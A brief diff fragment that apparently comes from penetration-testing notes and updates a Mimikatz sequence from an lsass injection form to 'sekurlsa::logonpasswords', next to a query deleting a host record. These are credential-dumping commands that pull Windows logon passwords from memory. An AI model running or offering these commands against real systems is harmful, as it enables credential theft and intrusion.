@@ -122,6 +122,5 @@ query DELETE FROM hosts WHERE ip_address='192.168.2.12'
 
 mimikatz
 priviledge::debug
-inject::process lsass.exe sekurlsa.dll
-@getLogonPasswords
+sekurlsa::logonpasswords
 
